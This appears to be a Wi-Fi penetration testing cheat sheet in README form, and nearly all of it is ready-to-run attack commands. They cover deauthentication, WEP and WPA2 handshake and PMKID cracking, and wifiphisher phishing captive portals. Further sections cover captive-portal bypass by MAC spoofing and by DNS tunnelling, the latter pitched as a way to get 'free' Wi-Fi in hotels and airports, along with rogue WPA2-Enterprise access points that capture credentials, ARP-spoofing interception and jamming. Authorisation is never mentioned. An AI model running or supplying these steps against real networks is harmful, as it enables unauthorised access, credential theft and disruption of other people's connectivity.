# Awesome Wifi pentesting

## Index

1. Basic commands

2. Open networks

	2.1. Captive portals

	2.2. Man in the Middle attack

3. WEP cracking

	3.1. No clients

4. WPA2-PSK cracking

	4.1. Cracking the 4-way-handshake
	
	4.2. PMKID attack

5. WPA2-Enterprise
	
	5.1. Radius brute force

	5.2. Fake Access Points

6. Fake Access Points

	6.1. WPA2-Enterprise attacks

	6.2. Hostapd

7. Other attacks

	7.1. Krack Attack

	7.2. OSINT

	7.3. Wifi Jamming

	7.4. Other frameworks

<br>
<br>
<br>
<br>
<br>



# 1. Basic commands


#### Set environment variable

```bash
VARIABLE=value
```

#### Check interface mode 

```bash
iwconfig $IFACE
```

#### Check interface status

```bash
ifconfig $IFACE
```

#### Set monitor mode

```
airmon-ng check kill
ifconfig $IFACE down
iwconfig $IFACE mode monitor
ifconfig $IFACE up
```

#### List networks

1. Set monitor mode

2. Run Airodump-ng-ng

```bash
airodump-ng $IFACE -c $CHANNEL -e $ESSID
```


#### Deauthentication

1. Only one client

```bash
 aireplay-ng -0 $NUMBER_DEAUTH_PACKETS -a $AP_MAC -c $CLIENT_MAC $IFACE
```

2. An Access Point (= all the clients in the AP)

```bash
 aireplay-ng -0 $NUMBER_DEAUTH_PACKETS -a $AP_MAC -c $CLIENT_MAC $IFACE
```

#### Get hidden SSID

1. List networks

List the networks using Airodump-ng and get the AP's MAC address ($AP_MAC) and one from a client ($CLIENT_MAC). Do not stop the capture.

2. Deauthenticate

In another terminal, deauthenticate a client or all of them. When Airodump-ng captures a handshake from this network, the name or ESSID will appear in the first terminal:

```bash
aireplay-ng -0 $NUMBER_DEAUTH_PACKETS -a $AP_MAC -c $CLIENT_MAC $IFACE
```

------------------------------------------

# 2. Open networks

## 2.1. Captive portals

### 2.1.1. Fake captive portals


1. Clone a website using [HTTrack](https://www.httrack.com/) 

2. Install [Wifiphiser](https://github.com/wifiphisher/wifiphisher). Add the HTTrack result in a new folder in *wifiphisher/data/phishing-pages/*$NEW_PAGE*/html* and a configuration file in  *wifiphisher/data/phishing-pages/*new_page*/config.ini*. *NOTE: Check the other phishing pages examples to see how this can be done.*

3. Recompile the project using *python setup.py install* or the binary in *bin*. 

4. This command works correctly in the latest Kali release after installing hostapd:

```
cd bin && ./wifiphisher -aI $IFACE -e $ESSID --force-hostapd -p $PLUGIN -nE
```

---------------------------------------------


### 2.1.2. Bypass 1: MAC spoofing

The first method to bypass a captive portal is to change your MAC address to one of an already authenticated user

1. Scan the network and get the list of IP and MAC addresses. You can use:

- nmap

- A custom script like [this](scripts/captive-portal-bypass/get_mac_ip.sh) (Bash) or [this](scripts/captive-portal-bypass/get_mac_ip.py) (Python)

2. Change your IP and MAC addresses. You can use:

- macchanger

- A custom script like [this](scripts/captive-portal-bypass/change_mac_ip.sh)(Bash)


Also, you can use scripts to automate the process like:

- [Poliva script](https://raw.githubusercontent.com/poliva/random-scripts/master/wifi/hotspot-bypass.sh)

- [Hackcaptiveportals](https://github.com/systematicat/hack-captive-portals)

---------------------------------------------


### 2.1.3. Bypass 2: DNS tunnelling

A second method is creating a DNS tunnel. For this, it is necessary to have an accessible DNS server of your own. You can use this method to bypass the captive portal and get "free" Wifi in hotel, airports...


1. Check the domain names are resolved:

```
nslookup example.com
```

2. Create 2 DNS records (in [Digital ocean](https://www.digitalocean.com/), [Afraid.org](http://freedns.afraid.org/)...):

- One "A record":  dns.$DOMAIN pointing to the $SERVER_IP (Example: dns.domain.com 139.59.172.117)

- One "NS record": hack.$DOMAIN pointing to dns.$DOMAIN (Example: hack.domain.com dns.domain.com)


3. Execution in the server

```
iodined -f -c -P $PASS -n $SERVER_IP 10.0.0.1 hack.$DOMAIN
```

4. Check if it works correctly in [here](https://code.kryo.se/iodine/check-it/)


5. Execution in the client

```
iodine -f -P $PASS $DNS_SERVER_IP hack.$DOMAIN
```

6. Create the tunnel

```
ssh -D 8080 $USER@10.0.0.1
```


## 2.2. Man in the Middle attack

Once you are in the network, you can test if it is vulnerable to Man in the Middle attacks.

1. ARP Spoofing attack using [Ettercap](https://www.ettercap-project.org/)

2. Sniff the traffic using Wireshark or TCPdump

3. Analyze the traffic using [Network Miner](https://www.netresec.com/?page=networkminer)

---------------------------------------------

# 3. WEP cracking

## 3.1. No clients

1. Start capture
```bash
airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $PCAP_FILE $IFACE
```


2. Accelerate the IV capture using *Fake authentication* + *Arp Request Replay Attack* + *Deauthenticate user*. Stop Airodump at *~*100.000 different IVs

```bash
aireplay-ng -1 0 -e $AP_NAME -a $AP_MAC -h $MY_MAC $IFACE
aireplay-ng -3 -b $AP_MAC -h $MY_MAC $IFACE
aireplay-ng -0 1 -a $AP_MAC -c $STATION_MAC $IFACE
aircrack-ng $PCAP_FILE
```

3. Crack the password using Aircrack-ng
```bash
aircrack-ng $PCAP_FILE
```

------------------------------------------

# 4. WPA2-PSK cracking

## 4.1. Cracking the 4-way-handshake

1. Start capture

```bash
airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $PCAP_FILE $IFACE
```

2. Deauthenticate an user. Stop airodump capture when you see a message 'WPA handshake: $MAC'

```bash
aireplay-ng -0 1 -a $AP_MAC -c $STATION_MAC $IFACE
```

3. Option 1: Crack the handshake using Aircrack-ng

```bash
aircrack-ng -w $WORDLIST capture.cap
```

4. Option 2: Crack the handshake using Pyrit

```
pyrit -r $PCAP_FILE analyze
pyrit -r $PCAP_FILE -o $CLEAN_PCAP_FILE strip
pyrit -i $WORDLIST import_passwords
pyrit eval
pyrit batch
pyrit -r $CLEAN_PCAP_FILE attack_db
```


## 4.2. PMKID attack

You can use [this script](scripts/pmkid.sh) or follow these steps:

1. Install Hcxdumptool and Hcxtool (you can use this [script](scripts/pmkid_install.sh)).

2. Create a text file ($FILTER_FILE) and add the MAC address without ":". You can use *sed* and redirect the output to a file:

```bash
echo $MAC | sed 's/://g' > $FILTER_FILE
```

3. Capture PMKID

```bash
hcxdumptool -i $IFACE -o $PCAPNG_FILE --enable__status=1 --filterlist=$FILTER_FILE --filtermode=2
```

4. Create $HASH_FILE and crack it

```bash
hcxpcaptool -z $HASH_FILE $PCAPNG_FILE

hashcat -a 0 -m 16800 $HASH_FILE $WORDLIST --force
```


## Wordlists

- [WPA2-wordlists](https://github.com/kennyn510/wpa2-wordlists)


------------------------------------------

# 5. WPA2-Enterprise


## 5.1. Radius brute force

- [Auto-EAP](https://github.com/Tylous/Auto_EAP)

## 5.2. Fake Access Points

Check "Hostapd-wpe" and "Freeradiuswpe+Hostapd" in paragraph 6



------------------------------------------

# 6. Fake Access Points


## 6.1. WPA2-Enterprise attacks

### Virtual machines download

- [Ubuntu 16.04.5, VMware (3.25 GB)](https://mega.nz/#!5h92EQYa!LHCNzYTN3GXEYYWcXgOUsnU37PpksbcaUFRlOK7RyRM) 

- [Kali 2019.1, VMware (4.99 GB)](https://mega.nz/#!s90G0SBL!P4tYAfAT42Q2JVQY723KcW0XzKqEC8lbxVuJVbu7aTM)

- [Ubuntu 16.04.5, VirtualBox (3.18 GB)](https://mega.nz/#!so9AzC7Q!XwAUmiSRUvldwrkNsSoyEbUTCUJDiyG3P1O_sYJNlcY)

--------------------------------

### Hostapd & Freeradius-wpe

Start the Access Point using:

```
sh freeradius_wpe_init.sh $AP_NAME $INTERFACE
```

Or:
```
freeradiuswpe $AP_NAME $INTERFACE
```

![Screenshot](img/1.png)

When a client connects, read logs with:

```
sh freeradius_wpe_read.sh
```

Or:

```
readlog
```
![Screenshot](img/2.png)

Result:

![Screenshot](img/3.png)

--------------------------------

### Hostapd-wpe

Start the Access Point using:

```
sh hostapd_wpe_init.sh $AP_NAME $INTERFACE
```

Or:

```
start_wpe $AP_NAME $INTERFACE
```

![Screenshot](img/4.png)

--------------------------------

### Installation

In case you do not want to use the virtual machine, you can install everything using:

```
sh install.sh
```

------------------------------------

## 6.2. Hostapd

```
hostapd $CONFIGURATION_FILE.conf
```

Configuration files:

- [802.11b/g/n with WPA2-PSK and CCMP](https://wiki.gentoo.org/wiki/Hostapd#802.11b.2Fg.2Fn_with_WPA2-PSK_and_CCMP)
- [802.11a/n/ac with WPA2-PSK and CCMP](https://wiki.gentoo.org/wiki/Hostapd#802.11a.2Fn.2Fac_with_WPA2-PSK_and_CCMP)
- [802.11b/g/n triple AP](https://wiki.gentoo.org/wiki/Hostapd#802.11b.2Fg.2Fn_triple_AP)
- [802.11ax or WPA3](https://github.com/vanhoefm/hostap-wpa3/blob/master/hostapd/hostapd_wpa3.conf)


------------------------------------


# 7. Other attacks

## 7.1. Krack Attack

- [Krack Attack Scripts](https://github.com/vanhoefm/krackattacks-scripts)


---------------------------------------------

## 7.2. OSINT

- [Wigle](https://wigle.net/)


---------------------------------------------

## 7.3. Wifi Jamming

- [Wifijammer](https://github.com/DanMcInerney/wifijammer) - This program can send deauthentication packets to both APs and clients. 

An example to deauthenticate all the devices except a Fake Acess Point:

```
sudo ./wifijammer -i $IFACE -s $FAKE_AP_MAC
```

---------------------------------------------

## 7.4. Other frameworks
- [Ekahau](https://www.ekahau.com/) - Useful for Wi-Fi planning (Windows) 
- [Vistumbler](https://www.vistumbler.net/) - Useful for wardriving (Windows)
- [Sniffair](https://github.com/Tylous/SniffAir) (Linux)
- [Wifi Pumpkin](https://github.com/P0cL4bs/WiFi-Pumpkin) - Framework for Rogue WiFi Access Point Attack (Linux)
- [Eaphammer](https://github.com/s0lst1c3/eaphammer) - Framework for Fake Access Points (Linux)

---------------------------------------------

